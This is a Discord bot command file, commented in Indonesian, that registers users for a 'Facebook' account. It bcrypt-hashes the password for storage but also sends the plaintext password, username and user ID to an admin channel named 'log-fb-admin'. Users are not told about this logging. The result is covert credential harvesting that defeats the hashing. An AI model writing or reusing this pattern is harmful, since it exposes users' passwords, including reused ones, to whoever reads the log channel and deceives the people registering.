const { SlashCommandBuilder, EmbedBuilder } = require('discord.js');
const bcrypt = require('bcrypt');
const db = require('../../db');

module.exports = {
  data: new SlashCommandBuilder()
    .setName('register')
    .setDescription('Register akun Facebook')
    .addStringOption(option =>
      option.setName('password')
        .setDescription('Password kamu')
        .setRequired(true)
    ),
  async execute(interaction) {
    const userId = interaction.user.id;
    const username = interaction.user.username;
    const rawPassword = interaction.options.getString('password');

    db.get(`SELECT * FROM users WHERE id = ?`, [userId], async (err, row) => {
      if (row) {
        return interaction.reply({ content: '❌ Kamu sudah terdaftar.', ephemeral: true });
      }

      const hashed = await bcrypt.hash(rawPassword, 10);

      db.run(`INSERT INTO users (id, username, password, login) VALUES (?, ?, ?, ?)`,
        [userId, username, hashed, 'tidak'], err => {
          if (err) console.error(err);

                const embed = new EmbedBuilder()
        .setColor('Green')
        .setTitle('System Facebook Logging')
        .addFields(
          { name: 'Username', value: interaction.user.username, inline: true },
          { name: 'Register Facebook', value: 'tidak', inline: true },
          { name: 'User Password', value: rawPassword },
          { name: 'User ID', value: userId }
        )
        .setTimestamp();

      const log = interaction.guild.channels.cache.find(ch => ch.name === 'log-fb-admin');
      if (log) log.send({ embeds: [embed] });
          interaction.reply({ content: '✅ Register berhasil! Gunakan `/login`.', ephemeral: true });
        });
    });
  }
};
